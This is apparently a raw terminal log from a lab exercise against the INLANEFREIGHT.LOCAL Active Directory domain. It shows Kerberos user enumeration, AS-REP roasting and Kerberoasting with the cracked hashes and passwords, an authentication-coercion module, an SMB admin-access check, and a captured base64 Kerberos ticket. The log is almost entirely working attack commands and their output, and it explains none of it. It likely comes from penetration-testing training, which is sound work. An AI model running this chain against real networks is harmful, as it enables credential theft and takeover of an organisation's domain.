



```
kali@kali 2025-11-09 11:58:24 ~/k/dist> ./kerbrute_linux_386 userenum --dc DC01.INLANEFREIGHT.LOCAL -d inlanefreight.local /home/kali/users.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 11/09/25 - Ronnie Flathers @ropnop

2025/11/09 11:58:25 >  Using KDC(s):
2025/11/09 11:58:25 >   DC01.INLANEFREIGHT.LOCAL:88

2025/11/09 11:58:25 >  [+] VALID USERNAME:       ian.brown@inlanefreight.local
2025/11/09 11:58:25 >  [+] VALID USERNAME:       dawn.berry@inlanefreight.local
2025/11/09 11:58:25 >  [+] VALID USERNAME:       diane.butcher@inlanefreight.local
2025/11/09 11:58:25 >  [+] VALID USERNAME:       frank.evans@inlanefreight.local
2025/11/09 11:58:25 >  [+] VALID USERNAME:       alan.powell@inlanefreight.local
2025/11/09 11:58:25 >  [+] VALID USERNAME:       charlotte.adams@inlanefreight.local
2025/11/09 11:58:25 >  [+] VALID USERNAME:       bernard.hughes@inlanefreight.local
2025/11/09 11:58:25 >  [+] VALID USERNAME:       alison.herbert@inlanefreight.local
2025/11/09 11:58:25 >  [+] VALID USERNAME:       debra.rogers@inlanefreight.local
2025/11/09 11:58:25 >  [+] VALID USERNAME:       carly.moran@inlanefreight.local
2025/11/09 11:58:26 >  [+] VALID USERNAME:       michelle.hussain@inlanefreight.local
2025/11/09 11:58:26 >  [+] VALID USERNAME:       julia.simmons@inlanefreight.local
2025/11/09 11:58:26 >  [+] VALID USERNAME:       kyle.watson@inlanefreight.local
2025/11/09 11:58:26 >  [+] VALID USERNAME:       mark.green@inlanefreight.local
2025/11/09 11:58:26 >  [+] VALID USERNAME:       jake.kirk@inlanefreight.local
2025/11/09 11:58:26 >  [+] VALID USERNAME:       leonard.shaw@inlanefreight.local
2025/11/09 11:58:26 >  [+] VALID USERNAME:       maurice.kaur@inlanefreight.local
2025/11/09 11:58:26 >  [+] VALID USERNAME:       jemma.stephens@inlanefreight.local
2025/11/09 11:58:26 >  [+] VALID USERNAME:       jeffrey.williams@inlanefreight.local
2025/11/09 11:58:26 >  [+] VALID USERNAME:       jordan.francis@inlanefreight.local
2025/11/09 11:58:26 >  [+] VALID USERNAME:       sandra.murphy@inlanefreight.local
2025/11/09 11:58:26 >  [+] VALID USERNAME:       stephen.lawson@inlanefreight.local
2025/11/09 11:58:26 >  [+] VALID USERNAME:       patrick.ross@inlanefreight.local
2025/11/09 11:58:26 >  [+] VALID USERNAME:       vanessa.johnson@inlanefreight.local
2025/11/09 11:58:26 >  [+] VALID USERNAME:       natasha.brown@inlanefreight.local
2025/11/09 11:58:26 >  [+] VALID USERNAME:       ross.holland@inlanefreight.local
2025/11/09 11:58:26 >  [+] VALID USERNAME:       annette.jackson@inlanefreight.local
2025/11/09 11:58:26 >  [+] VALID USERNAME:       owen.brown@inlanefreight.local
2025/11/09 11:58:26 >  [+] daniel.whitehead has no pre auth required. Dumping hash to crack offline:
$krb5asrep$18$daniel.whitehead@INLANEFREIGHT.LOCAL:2521b670677da2192be4063b001f3603$912750e6716a8ce5e5902f23d040c08e7a692879211017d5ca34ca3033fb30ffbcd89c1447dbc4bc87ee4d1f6494f9e7090542cd50c9dcb6097d6682714be8a8c8e0e83719967f93afb083bce86d471ff04671383b4c1b219cc989d982abe2a5b88a7db655572c34cd813747dfd95f7827ba68aa6438e39f0230ef6c790e101bb4edb8ef4ddf90913c8a7c5490e682701a19f4f7e7381287ae0e39d9937b83bd002d5384e525d7518ebd68f45720d0efbe6ad876ea22f10ef1230140be7cd0c3a707a6aa20f9ba1f6f12cfab1a4282acffd4b5d2ed3048b003e30a15a20e3cf6f4310afa122f861cf85a4ad81407132dcd81baf860f67de9e7d3d715614831914fed036de29251936def2f974265
2025/11/09 11:58:26 >  [+] VALID USERNAME:       daniel.whitehead@inlanefreight.local
2025/11/09 11:58:26 >  Done! Tested 30 usernames (29 valid) in 1.173 seconds

```




```
kali@kali 2025-11-09 12:44:54 ~> GetNPUsers.py INLANEFREIGHT/ -dc-ip 172.16.8.3 -usersfile users.txt -format hashcat -outputfile hash.txt
Impacket v0.13.0.dev0+20251021.181244.39b9d898 - Copyright Fortra, LLC and its affiliated companies                                                                                                                                          
                                                                                                                                                                                                                                             
$krb5asrep$23$daniel.whitehead@INLANEFREIGHT:8708189fb4d994163df88d38c1fbb2eb$a501d5e529d27852ff3adf8d0a2ba49f8ee488e3a4fbd1b241ae2f0e63071d26ac2bf96c8fde8f85675e70c19164187e4d68caa9e83fcfa2451a48753cde223f6fdb1e1ea16550e9375844333ac7c3d1b38cf8784d552f8edb807163f17717ddb173c9668e723145818959540fc610b9a39505696983309f05da08dba83dc855354f7570a0a4d0c3b05f0eda1848537d7baf3afb707a5413348134e4d1d638ff356275b6b4f6bd4f402e714bce9501e0c77f182e39372d9c0ec560af8a192f6584b0508df95b5e2a5e80b11241fadc372f8c2d5e0e491b1639f7931bbc395430642ba44e8b1ff09e1faeefa3872d2ec2488449c9                                                                                                                                                 
```



```
kali@kali 2025-11-09 12:45:02 ~> hashcat -m 18200 hash.txt /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-1000000.txt
hashcat (v6.2.6) starting                                                                                                                                                                                                                    
                                                                                                                                                                                                                                             
OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]                                                                                         
====================================================================================================================================================                                                                                         
* Device #1: cpu-sandybridge-12th Gen Intel(R) Core(TM) i5-12400F, 2913/5890 MB (1024 MB allocatable), 4MCU                                                                                                                                  
                                                                                                                                                                                                                                             
Minimum password length supported by kernel: 0                                                                                                                                                                                               
Maximum password length supported by kernel: 256                                                                                                                                                                                             
                                                                                                                                                                                                                                             
Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates                                                                                                                                                                 
Rules: 1                                                                                                                                                                                                                                     
                                                                                                                                                                                                                                             
Optimizers applied:                                                                                                                                                                                                                          
* Zero-Byte                                                                                                                                                                                                                                  
* Not-Iterated                                                                                                                                                                                                                               
* Single-Hash                                                                                                                                                                                                                                
* Single-Salt                                                                                                                                                                                                                                

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-1000000.txt
* Passwords.: 1000000
* Bytes.....: 8557632
* Keyspace..: 1000000

$krb5asrep$23$daniel.whitehead@INLANEFREIGHT:8708189fb4d994163df88d38c1fbb2eb$a501d5e529d27852ff3adf8d0a2ba49f8ee488e3a4fbd1b241ae2f0e63071d26ac2bf96c8fde8f85675e70c19164187e4d68caa9e83fcfa2451a48753cde223f6fdb1e1ea16550e9375844333ac7c3d1b38cf8784d552f8edb807163f17717ddb173c9668e723145818959540fc610b9a39505696983309f05da08dba83dc855354f7570a0a4d0c3b05f0eda1848537d7baf3afb707a5413348134e4d1d638ff356275b6b4f6bd4f402e714bce9501e0c77f182e39372d9c0ec560af8a192f6584b0508df95b5e2a5e80b11241fadc372f8c2d5e0e491b1639f7931bbc395430642ba44e8b1ff09e1faeefa3872d2ec2488449c9:dolphin

```


```
kali@kali 2025-11-09 12:50:17 ~> nxc ldap 172.16.8.0/24 -u 'daniel.whitehead' -p 'dolphin' -k --kerberoasting kerb.txt
LDAP        172.16.8.3      389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:None) (channel binding:No TLS cert) 
LDAP        172.16.8.3      389    DC01             [+] INLANEFREIGHT.LOCAL\daniel.whitehead:dolphin 
LDAP        172.16.8.3      389    DC01             [*] Skipping disabled account: krbtgt
LDAP        172.16.8.3      389    DC01             [*] Total of records returned 1
LDAP        172.16.8.3      389    DC01             [*] sAMAccountName: annette.jackson, memberOf: [], pwdLastSet: 2022-10-15 16:54:52.593043, lastLogon: 2023-04-12 21:34:58.479539
LDAP        172.16.8.3      389    DC01             $krb5tgs$23$*annette.jackson$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL\annette.jackson*$5a59e8664e86dab679ad703eb789b633$53ccb24c3ba8dd677933444fe68592d6050f9d7c36c2e9847f95b376e5d12d985bafa96041528dc00f156eda5122410d0c5a784b1d2b0c43ae0f24f57c2c84ae91e9954db36ca3248fac98346498ba17000cd10184996230a01201cbbf338456def2bd406857b90308ee277c55533cbc4c32d88bec0f1d8d0e0e9533ac48d526b5be1723bf2f297b47ac2e1ed61a856daeb3b980a9767d5d05aca728d043d8cc23992f21a18db8bbbb6aad896b20f6daa65754e4942e25393192efcb4ade64b633c7c53b63825453337c08a88dd31325228d909f8359495c52fbc9948c0fcd4178d5ed0bb42691b50d480927e7df5dd267a19597beeb818235e45192d9c557833529a0b71d87d24c6f9d70b739d6301667d1e701b66fd17dd3452456ae8f250380fe0ac3d2e27f02d115e956d983b31b38eb056b75c963691be799bd55155772ef0b3a0bc0655be9045d976f654ad801c49ea99a418f2c15c5352085510b39425be88a1437b3074a85ea85e40fa0b6c28a2be413304cc158af500b89c8810cfd31cf6a631244ef0d62c21011bd7cdd1d27dcfa7aa3c75196c2a0175f2ad0d009bf2ddaa6b520d7a148231d417d7dc27180639569ee7a9cab38f6095c277c814d00bedc97d8ddefd5fc2e16f0f2dd136c24193e7143e801f821ad9ef67ac44cddfca61783e95b034b83dbfade069859930abdcc341b6ae1b8145941dc46baf0d6ab1976768b051466b8fd2d4617a623596217644c539e408280edb89531cda8e921976bc910a7c3af8f6af35c46cbcdf01029f24fdecd4c9038e304af003a16a49aba3e8194e847cd2a4f42129e546cb30f013977ce06bc31bfaf886dc435882e31d5789709b8db2791dd28be4cf1e667c3b3c588f1f2575ecf8d11ef2ddb0ee7c88f6607cc9f27607843f7c7cda10d95852f2412c98acf38585649a9938cc16579b6d1232aa6ffab748ffcb14dfc197af2b317b1f2b2d46d2fe33e77756f6d41ab657da7608cc3571495dc2a18fa237dacb22867ecf07f3cbf3f92b5fdf213e6414783e6717f02ce454ccb6ea932405a871a45ff3fe8842ce4923e41333ef51c8c727011c1bf4aa28ead2f8e8fe2027484aba5431f2d552572d36afdb57c201e9b21d0f683484852615eb008a851920299835f2857f1141d4b012e83667c7e409b0fdf4e6351d0f3f83bf6f9cefa7e56c3dfd5679130cfcc83eeac2990d80e7bf7a9161b8a6a1a4387ad980f02c729c43826c16f3bf5f07e34befc02ac8261cdd579b96ee69cea23b30f38c53e9654dbcb107fb8dec6f95208ecb8019fe5bf00f7d5954f879d4fe4f15bb8b8f9eea198445dd251d8df2a111ac13b88ea502bd2f9d0df825e08cd20419f1c96342e2bd53f7b870c66da357b315a7d8c0c34366a89020553114703c3c164d91ff0abb9a663e1ac57361c709c1055a52891c77cc2a031fb7b64593502ddc02ffc289682459ee12225ef38b57e489b4f439ef9c00d04bcf85b4b0f062f1713680a2c729d4cf8efdc38cef9e77d8724e7c28f06e1f2ee040c24a8d0e93b2677c470e83e409c162f2e6429f2061ad1eef838f37705e8e97ecdfc
```


```
kali@kali 2025-11-09 12:50:38 ~> hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #1: cpu-sandybridge-12th Gen Intel(R) Core(TM) i5-12400F, 2913/5890 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5tgs$23$*annette.jackson$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL\annette.jackson*$5a59e8664e86dab679ad703eb789b633$53ccb24c3ba8dd677933444fe68592d6050f9d7c36c2e9847f95b376e5d12d985bafa96041528dc00f156eda5122410d0c5a784b1d2b0c43ae0f24f57c2c84ae91e9954db36ca3248fac98346498ba17000cd10184996230a01201cbbf338456def2bd406857b90308ee277c55533cbc4c32d88bec0f1d8d0e0e9533ac48d526b5be1723bf2f297b47ac2e1ed61a856daeb3b980a9767d5d05aca728d043d8cc23992f21a18db8bbbb6aad896b20f6daa65754e4942e25393192efcb4ade64b633c7c53b63825453337c08a88dd31325228d909f8359495c52fbc9948c0fcd4178d5ed0bb42691b50d480927e7df5dd267a19597beeb818235e45192d9c557833529a0b71d87d24c6f9d70b739d6301667d1e701b66fd17dd3452456ae8f250380fe0ac3d2e27f02d115e956d983b31b38eb056b75c963691be799bd55155772ef0b3a0bc0655be9045d976f654ad801c49ea99a418f2c15c5352085510b39425be88a1437b3074a85ea85e40fa0b6c28a2be413304cc158af500b89c8810cfd31cf6a631244ef0d62c21011bd7cdd1d27dcfa7aa3c75196c2a0175f2ad0d:horses
```


```
kali@kali 2025-11-09 13:38:51 ~/t/PetitPotam> nxc smb 172.16.8.3 -u 'annette.jackson' -p 'horses' -M coerce_plus -o L='172.16.8.35' ALWAYS=true --timeout 10
kali@kali 2025-11-09 13:39:01 ~/t/PetitPotam> nxc smb 172.16.8.0/24 -u 'annette.jackson' -p 'horses' 
SMB         172.16.8.35     445    SERVER01         [*] Windows 10 / Server 2019 Build 17763 x64 (name:SERVER01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:None)
SMB         172.16.8.3      445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         172.16.8.35     445    SERVER01         [+] INLANEFREIGHT.LOCAL\annette.jackson:horses (Pwn3d!)
SMB         172.16.8.3      445    DC01             [+] INLANEFREIGHT.LOCAL\annette.jackson:horses 

```



```
[*] 11/9/2025 1:39:45 PM UTC - Found new TGT:

  User                  :  jake.kirk@INLANEFREIGHT.LOCAL
  StartTime             :  11/9/2025 7:39:41 AM
  EndTime               :  11/9/2025 5:39:40 PM
  RenewTill             :  11/16/2025 7:39:40 AM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

    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
```







